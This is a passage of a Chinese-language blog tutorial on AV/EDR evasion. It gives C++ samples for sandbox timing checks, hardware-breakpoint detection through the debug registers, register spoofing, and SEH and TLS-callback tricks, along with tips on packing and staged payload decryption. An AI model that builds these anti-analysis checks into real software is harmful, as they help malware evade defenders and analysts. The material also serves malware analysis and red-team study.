<p><strong>使用场景：</strong><br>一些仿真器无法正确递增 TSC，或者返回不现实的值。</p>
<hr>
<h3 id="4-基于循环的延时检测"><a href="#4-基于循环的延时检测" class="headerlink" title="4. 基于循环的延时检测"></a>4. 基于循环的延时检测</h3><p>一些沙箱 <strong>加速 <code>Sleep()</code>，但不会加速 CPU 密集型循环</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD start = <span class="hljs-built_in">GetTickCount</span>();<br>    <br>    <span class="hljs-comment">// 长时间的循环模拟延时</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000000</span>; ++i) &#123;<br>        <span class="hljs-comment">// 空操作</span><br>    &#125;<br><br>    DWORD elapsed = <span class="hljs-built_in">GetTickCount</span>() - start;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 循环执行时间： &quot;</span> &lt;&lt; elapsed &lt;&lt; <span class="hljs-string">&quot; 毫秒\n&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (elapsed &lt; <span class="hljs-number">500</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[-] 沙箱检测到（循环执行过快）\n&quot;</span>;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-综合使用-Sleep-RDTSC-QueryPerformanceCounter"><a href="#5-综合使用-Sleep-RDTSC-QueryPerformanceCounter" class="headerlink" title="5. 综合使用 Sleep + RDTSC + QueryPerformanceCounter"></a>5. 综合使用 Sleep + RDTSC + QueryPerformanceCounter</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    LARGE_INTEGER freq, start, end;<br>    <span class="hljs-built_in">QueryPerformanceFrequency</span>(&amp;freq);<br>    <span class="hljs-built_in">QueryPerformanceCounter</span>(&amp;start);<br><br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">3000</span>);<br><br>    <span class="hljs-built_in">QueryPerformanceCounter</span>(&amp;end);<br>    <span class="hljs-type">double</span> elapsed = (<span class="hljs-type">double</span>)(end.QuadPart - start.QuadPart) / freq.QuadPart;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 高分辨率时间： &quot;</span> &lt;&lt; elapsed &lt;&lt; <span class="hljs-string">&quot; 秒\n&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (elapsed &lt; <span class="hljs-number">2.0</span>) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[-] 执行过快，沙箱可能存在。\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 可能是真实执行环境。\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="6-实际使用案例"><a href="#6-实际使用案例" class="headerlink" title="6. 实际使用案例"></a>6. 实际使用案例</h3><ul>
<li><p><strong>TrickBot, Emotet, Remcos</strong>: 延迟执行超过 60 秒</p>
</li>
<li><p><strong>NanoCore RAT</strong>: 使用嵌套循环和 <code>GetTickCount()</code> 检查</p>
</li>
<li><p><strong>LockBit 3.0</strong>: 针对多个 API 测量 <code>Sleep()</code> 的时间</p>
</li>
</ul>
<hr>
<h3 id="7-高级：通过-CreateTimerQueueTimer-实现线程级延时"><a href="#7-高级：通过-CreateTimerQueueTimer-实现线程级延时" class="headerlink" title="7. 高级：通过 CreateTimerQueueTimer 实现线程级延时"></a>7. 高级：通过 <code>CreateTimerQueueTimer</code> 实现线程级延时</h3><p>比 <code>Sleep</code> 更具隐蔽性（不易被防病毒监控）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> CALLBACK <span class="hljs-title">TimerCallback</span><span class="hljs-params">(PVOID lpParam, BOOLEAN TimerOrWaitFired)</span> </span>&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 定时器完成。继续执行。\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hTimer = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">CreateTimerQueueTimer</span>(&amp;hTimer, <span class="hljs-literal">NULL</span>, TimerCallback, <span class="hljs-literal">NULL</span>, <span class="hljs-number">5000</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 定时器计划 5 秒...\n&quot;</span>;<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">6000</span>);  <span class="hljs-comment">// 确保定时器有足够时间触发</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="实际使用技巧"><a href="#实际使用技巧" class="headerlink" title="实际使用技巧"></a>实际使用技巧</h3><ul>
<li><p><strong>避免仅使用 <code>Sleep()</code> 延时</strong>；结合使用：</p>
<ul>
<li><p>时间验证</p>
</li>
<li><p>用户交互（鼠标检测）</p>
</li>
<li><p>线程定时器或隐藏线程</p>
</li>
</ul>
</li>
<li><p><strong>使用熵值降低的打包</strong> 结合嵌入延时</p>
</li>
<li><p>实现 <strong>分阶段执行</strong>：初始阶段为 <code>Sleep</code> 或计时；第二阶段在检查通过后解密载荷。</p>
</li>
</ul>
<hr>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques-part4/">反调试与反跟踪技术 - Part4</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SolomonSklash/SleepyCrypt">SleepyCrypt GitHub</a></p>
</li>
<li><p>MalwareBazaar 和 Hybrid Analysis 样本（TrickBot, Remcos, Nanocore）</p>
</li>
</ul>
<h2 id="AV-EDR规避实践技术-7-7-硬件断点检测与规避"><a href="#AV-EDR规避实践技术-7-7-硬件断点检测与规避" class="headerlink" title="AV&#x2F;EDR规避实践技术 - 7.7 - 硬件断点检测与规避"></a>AV&#x2F;EDR规避实践技术 - 7.7 - 硬件断点检测与规避</h2><p><strong>目标</strong></p>
<p>检测并规避通过处理器调试寄存器（DR0–DR7）设置的硬件断点，这些寄存器常用于<strong>隐蔽调试</strong>和<strong>逆向工程</strong>。</p>
<hr>
<h3 id="什么是硬件断点？"><a href="#什么是硬件断点？" class="headerlink" title="什么是硬件断点？"></a><strong>什么是硬件断点？</strong></h3><p>与修改代码的软件断点（例如 <code>INT3</code>，<code>0xCC</code>）不同，硬件断点：</p>
<ul>
<li><p>使用<strong>CPU调试寄存器</strong>（DR0–DR3）监视特定的内存地址</p>
</li>
<li><p>可以设置为<strong>在访问、写入、读&#x2F;写或执行时触发</strong></p>
</li>
<li><p><strong>非侵入式</strong>，使其更加隐蔽，更难以检测</p>
</li>
</ul>
<p>这些断点常用于调试器，如WinDbg、x64dbg、OllyDbg以及恶意软件分析中。</p>
<hr>
<h3 id="如何检测硬件断点"><a href="#如何检测硬件断点" class="headerlink" title="如何检测硬件断点"></a><strong>如何检测硬件断点</strong></h3><h4 id="1-通过-NtQueryInformationThread-查询调试寄存器"><a href="#1-通过-NtQueryInformationThread-查询调试寄存器" class="headerlink" title="1. 通过 NtQueryInformationThread 查询调试寄存器"></a><strong>1. 通过 <code>NtQueryInformationThread</code> 查询调试寄存器</strong></h4><p>最常见的方法是使用未文档化的 <code>NtQueryInformationThread</code> 与 <code>ThreadDebugPort</code> 或 <code>ThreadInformationClass = 0x11</code>。</p>
<p>但要直接访问调试寄存器，通常需要<strong>内联汇编</strong>或<strong>内建函数</strong>。</p>
<h4 id="2-直接访问DRx（汇编-x86）"><a href="#2-直接访问DRx（汇编-x86）" class="headerlink" title="2. 直接访问DRx（汇编 - x86）"></a><strong>2. 直接访问DRx（汇编 - x86）</strong></h4><p>这种方法适用于32位代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check_hardware_breakpoints</span><span class="hljs-params">()</span> </span>&#123;<br>    CONTEXT ctx = &#123;&#125;;<br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(<span class="hljs-built_in">GetCurrentThread</span>(), &amp;ctx)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果任何调试寄存器DR0–DR3非零，表示存在硬件断点</span><br>    <span class="hljs-keyword">if</span> (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check_hardware_breakpoints</span>()) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[-] 检测到硬件断点，退出。\n&quot;</span>;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] 未检测到硬件断点，继续执行。\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="输出示例："><a href="#输出示例：" class="headerlink" title="输出示例："></a><strong>输出示例：</strong></h4><ul>
<li><p><strong>在x64dbg中：</strong> 如果设置了硬件断点，进程会退出。</p>
</li>
<li><p><strong>没有调试器时：</strong> 执行继续正常进行。</p>
</li>
</ul>
<hr>
<h3 id="为什么这有效"><a href="#为什么这有效" class="headerlink" title="为什么这有效"></a><strong>为什么这有效</strong></h3><ul>
<li><p><strong>调试寄存器</strong>（DR0–DR3）存储最多4个硬件断点地址。</p>
</li>
<li><p>当调试器设置硬件断点时，它会写入这些寄存器之一。</p>
</li>
<li><p><code>GetThreadContext()</code> 与 <code>CONTEXT_DEBUG_REGISTERS</code> 可以检索这些值。</p>
</li>
</ul>
<hr>
<h3 id="3-混淆检测：反逆向工程技巧"><a href="#3-混淆检测：反逆向工程技巧" class="headerlink" title="3. 混淆检测：反逆向工程技巧"></a><strong>3. 混淆检测：反逆向工程技巧</strong></h3><p>可以通过随机化检测位置来避免静态分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">detect_dr_regs</span><span class="hljs-params">()</span> </span>&#123;<br>    CONTEXT ctx = &#123;<span class="hljs-number">0</span>&#125;;<br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br>    HANDLE hThread = <span class="hljs-built_in">GetCurrentThread</span>();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetThreadContext</span>(hThread, &amp;ctx)) &#123;<br>        <span class="hljs-keyword">if</span> (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) &#123;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;[-] 检测到调试器（硬件断点）\n&quot;</span>;<br>            <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>还可以在单独的线程中或分阶段执行此代码。</p>
<hr>
<h3 id="4-高级：通过结构化异常处理（SEH）扫描DR寄存器"><a href="#4-高级：通过结构化异常处理（SEH）扫描DR寄存器" class="headerlink" title="4. 高级：通过结构化异常处理（SEH）扫描DR寄存器"></a><strong>4. 高级：通过结构化异常处理（SEH）扫描DR寄存器</strong></h3><p>一些恶意软件触发<strong>故意的错误</strong>，并在异常处理程序中检查寄存器值，使静态跟踪更加困难。</p>
<hr>
<h3 id="5-实际恶意软件使用"><a href="#5-实际恶意软件使用" class="headerlink" title="5. 实际恶意软件使用"></a><strong>5. 实际恶意软件使用</strong></h3><ul>
<li><p><strong>Qbot</strong>、<strong>Cobalt Strike加载程序</strong>和<strong>FIN7加载器</strong>中包含对DRx断点的检查。</p>
</li>
<li><p>经常与 <code>IsDebuggerPresent</code>、TLS回调和反虚拟化技术结合使用。</p>
</li>
</ul>
<hr>
<h3 id="硬件断点对红队的危险性"><a href="#硬件断点对红队的危险性" class="headerlink" title="硬件断点对红队的危险性"></a><strong>硬件断点对红队的危险性</strong></h3><ul>
<li><p>它们<strong>不会修改</strong>代码或内存（与软件断点不同）。</p>
</li>
<li><p>它们更加<strong>隐蔽</strong>，且在执行过程中<strong>更具持久性</strong>。</p>
</li>
<li><p>分析人员通常会在API函数上设置硬件断点（例如 <code>VirtualAlloc</code>、<code>CreateProcess</code> 等）以追踪恶意软件行为。</p>
</li>
</ul>
<p>因此，<strong>检测和应对硬件断点</strong>是高级恶意软件或红队载荷的重要反调试措施。</p>
<hr>
<h3 id="6-DR寄存器的内部视图"><a href="#6-DR寄存器的内部视图" class="headerlink" title="6. DR寄存器的内部视图"></a><strong>6. DR寄存器的内部视图</strong></h3><table>
<thead>
<tr>
<th>寄存器</th>
<th>目的</th>
</tr>
</thead>
<tbody><tr>
<td>DR0–DR3</td>
<td>包含断点地址</td>
</tr>
<tr>
<td>DR6</td>
<td>调试状态寄存器（指示哪个断点被触发）</td>
</tr>
<tr>
<td>DR7</td>
<td>调试控制寄存器（启用&#x2F;禁用断点）</td>
</tr>
</tbody></table>
<p><code>DR7</code> 启用&#x2F;禁用断点，<code>DR6</code> 告知哪个断点被触发。</p>
<p>因此，为了实现强有力的检测，应该同时<strong>检查 DR0–DR3（设置的地址）和 DR7（启用标志）</strong>。</p>
<hr>
<h3 id="7-扩展检测：DR7分析"><a href="#7-扩展检测：DR7分析" class="headerlink" title="7. 扩展检测：DR7分析"></a><strong>7. 扩展检测：DR7分析</strong></h3><p>让我们检查断点是否<strong>启用</strong>，而不仅仅是检查地址是否存在。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">detect_enabled_hardware_breakpoints</span><span class="hljs-params">()</span> </span>&#123;<br>    CONTEXT ctx = &#123;&#125;;<br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetThreadContext</span>(<span class="hljs-built_in">GetCurrentThread</span>(), &amp;ctx)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查DR7中的任何断点是否启用</span><br>    <span class="hljs-type">bool</span> enabled_bp = (ctx.Dr7 &amp; <span class="hljs-number">0xFF</span>) != <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 检查DR0–DR3中是否设置了任何地址</span><br>    <span class="hljs-type">bool</span> address_bp = ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;<br><br>    <span class="hljs-keyword">return</span> enabled_bp || address_bp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">detect_enabled_hardware_breakpoints</span>()) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;检测到硬件断点\n&quot;</span>;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;未发现硬件断点\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="为什么更好："><a href="#为什么更好：" class="headerlink" title="为什么更好："></a>为什么更好：</h3><ul>
<li><p>通过DR7位掩码检测启用的断点。</p>
</li>
<li><p>防止DRx已设置但未启用的情况。</p>
</li>
</ul>
<hr>
<h3 id="8-规避对策：混淆与随机化"><a href="#8-规避对策：混淆与随机化" class="headerlink" title="8. 规避对策：混淆与随机化"></a><strong>8. 规避对策：混淆与随机化</strong></h3><h3 id="8-1-在子线程中执行检测"><a href="#8-1-在子线程中执行检测" class="headerlink" title="8.1 在子线程中执行检测"></a>8.1 在子线程中执行检测</h3><p>为检测创建一个专用子线程，可能避免检测本身：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">HWBPCheckThread</span><span class="hljs-params">(LPVOID)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">detect_enabled_hardware_breakpoints</span>()) &#123;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">run_check_in_thread</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, HWBPCheckThread, <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, <span class="hljs-number">200</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="8-2-混淆上下文标志"><a href="#8-2-混淆上下文标志" class="headerlink" title="8.2 混淆上下文标志"></a>8.2 混淆上下文标志</h3><p>使用替代API或混合使用 <code>SetThreadContext</code> &#x2F; <code>NtQueryInformationThread</code> 来混淆动态分析。</p>
<hr>
<h3 id="9-欺骗上下文以迷惑调试器"><a href="#9-欺骗上下文以迷惑调试器" class="headerlink" title="9. 欺骗上下文以迷惑调试器"></a><strong>9. 欺骗上下文以迷惑调试器</strong></h3><p>恶意软件可以通过<strong>设置假DRx寄存器</strong>，使用 <code>SetThreadContext</code> 来欺骗调试器或沙箱，追踪错误的地址。</p>
<p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spoof_debug_registers</span><span class="hljs-params">()</span> </span>&#123;<br>    CONTEXT ctx = &#123;&#125;;<br>    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;<br><br>    <span class="hljs-comment">// 误导的地址</span><br>    ctx.Dr0 = <span class="hljs-number">0xDEADBEEF</span>;<br>    ctx.Dr1 = <span class="hljs-number">0xBAADF00D</span>;<br>    ctx.Dr7 = <span class="hljs-number">0x03</span>; <span class="hljs-comment">// 启用DR0</span><br><br>    <span class="hljs-built_in">SetThreadContext</span>(<span class="hljs-built_in">GetCurrentThread</span>(), &amp;ctx);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这可能导致调试器崩溃或误导。</p>
<hr>
<h3 id="10-基于SEH的硬件断点检测"><a href="#10-基于SEH的硬件断点检测" class="headerlink" title="10. 基于SEH的硬件断点检测"></a><strong>10. 基于SEH的硬件断点检测</strong></h3><p>注入错误并使用SEH间接检查DRx（更隐蔽的方法）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">LONG WINAPI <span class="hljs-title">exception_handler</span><span class="hljs-params">(EXCEPTION_POINTERS* ex)</span> </span>&#123;<br>    CONTEXT* ctx = ex-&gt;ContextRecord;<br><br>    <span class="hljs-keyword">if</span> (ctx-&gt;Dr0 || ctx-&gt;Dr1 || ctx-&gt;Dr2 || ctx-&gt;Dr3 || (ctx-&gt;Dr7 &amp; <span class="hljs-number">0xFF</span>)) &#123;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">trigger_exception</span><span class="hljs-params">()</span> </span>&#123;<br>    __try &#123;<br>        <span class="hljs-type">int</span>* p = <span class="hljs-literal">nullptr</span>;<br>        *p = <span class="hljs-number">0</span>; <span class="hljs-comment">// 错误触发SEH</span><br>    &#125; __except (<span class="hljs-built_in">exception_handler</span>(<span class="hljs-built_in">GetExceptionInformation</span>())) &#123;<br>        <span class="hljs-comment">// 继续执行</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这样可以将断点检查隐藏在静态分析和钩子之外。</p>
<hr>
<h3 id="11-使用TLS回调进行早期检测"><a href="#11-使用TLS回调进行早期检测" class="headerlink" title="11. 使用TLS回调进行早期检测"></a><strong>11. 使用TLS回调进行早期检测</strong></h3><p>注册TLS回调以在<code>main()</code>执行之前检测断点：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/INCLUDE:tls_callback_func&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">tls_callback</span><span class="hljs-params">(PVOID h, DWORD reason, PVOID r)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;<br>        <span class="hljs-keyword">if</span><br><br><br>(<span class="hljs-built_in">detect_enabled_hardware_breakpoints</span>()) &#123;  <br><span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">1</span>);  <br>&#125;  <br>&#125;  <br>&#125;<br><br>EXTERN_C  <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64  </span><br><span class="hljs-type">const</span>  <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>PIMAGE_TLS_CALLBACK tls_callback_func = tls_callback;<br><br></code></pre></td></tr></table></figure>

<p>这可以防止调试器在执行开始后附加。</p>
<hr>
<h3 id="12-实际案例：al-khaser"><a href="#12-实际案例：al-khaser" class="headerlink" title="12. 实际案例：al-khaser"></a><strong>12. 实际案例：al-khaser</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/LordNoteworthy/al-khaser">al-khaser</a> 实现了多种反调试技术，包括：</p>
<ul>
<li>DRx寄存器检查</li>
<li>DR7位掩码分析</li>
<li>时间差异</li>
<li>TLS回调</li>
<li>INT 3陷阱</li>
</ul>
<p>研究其代码以理解多层规避技术。</p>
<hr>
<h3 id="参考文献与工具"><a href="#参考文献与工具" class="headerlink" title="参考文献与工具"></a><strong>参考文献与工具</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/LordNoteworthy/al-khaser">al-khaser</a>：检测硬件断点的反调试&#x2F;虚拟化工具</li>
<li><a target="_blank" rel="noopener" href="https://malgamy.github.io/revese%20enginnering/Anti-debugging-and-anti-tracing-techniques-part4/">AntiRE Techniques – Part 4</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/">Windows Internals</a> 深入理解调试机制</li>
</ul>
